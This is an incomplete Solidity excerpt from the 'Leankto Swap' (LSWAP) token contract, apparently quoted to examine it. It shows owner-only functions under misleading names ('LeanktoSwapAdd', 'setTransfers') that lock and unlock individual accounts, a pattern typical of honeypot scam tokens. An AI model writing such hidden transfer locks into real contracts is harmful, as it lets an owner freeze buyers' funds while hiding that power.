...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Leankto Swap';
    string constant public symbol = 'LSWAP';
    ...
    function LeanktoSwapAdd(address account) public onlyOwner {
        _locked[account] = true;
    }

    function setTransfers(address account) public onlyOwner {
        _locked[account] = false;
    }
    
    
    function TransactStatus(address account) public view returns (bool) {
...
contract LeanktoSwap is BaseToken {
